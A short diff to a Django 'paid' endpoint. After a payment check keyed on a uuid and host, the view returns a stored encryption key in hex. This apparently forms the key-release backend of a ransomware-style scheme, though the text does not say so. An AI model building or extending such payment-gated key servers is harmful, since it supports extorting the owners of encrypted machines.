@@ -27,7 +27,7 @@ def pay(request):
 
 @csrf_exempt
 def paid(request):
-    datas = {"paid":False}
+    datas = {"paid":False, "encryption_key": ""}
     expected_keys = ("uuid", "host")  ##Tuples -> faster && non modifiable
 
     # Check if request body exists
@@ -45,6 +45,10 @@ def paid(request):
             sp = SimpleDatas.objects.get(uuid=content["uuid"],host=content["host"])
 
             datas["paid"] = sp.paid
+
+            if(sp.paid) :
+
+                datas["encryption_key"] = ":".join("{:02x}".format(ord(c)) for c in sp.encryption_key)
 
     return JsonResponse(datas)
 
